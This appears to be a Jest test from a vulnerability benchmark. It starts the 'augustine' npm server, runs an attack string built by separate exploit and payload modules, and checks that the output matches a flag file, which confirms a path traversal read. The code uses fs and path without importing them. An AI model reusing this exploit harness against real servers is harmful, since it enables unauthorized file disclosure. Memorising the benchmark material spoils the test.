test("Path Traversal in augustine", () => {
  const { exploitFunction } = require("./function.js");
  const { getPayload } = require('./payload.js');
  const { exec } = require("child_process");
  const sleep = require("sleep");

  const payload = getPayload();
  const { attack_string } = exploitFunction(payload);

  // Start the server
  let server = "node ./node_modules/augustine/bin/augustine.js -p 8968";
  exec(server, (error, stdout) => {
    if (error) throw error;

    sleep.sleep(2);

    // Execute the attack string
    exec(attack_string, (error, stdout) => {
      if (error) throw error;

      // Read the flag file
      const hostsFile = fs.readFileSync(path.resolve(__dirname, "../flag.html")).toString(); // Ensure path is imported here

      // Verify the output
      expect(stdout).toBe(hostsFile);
    });
  });
});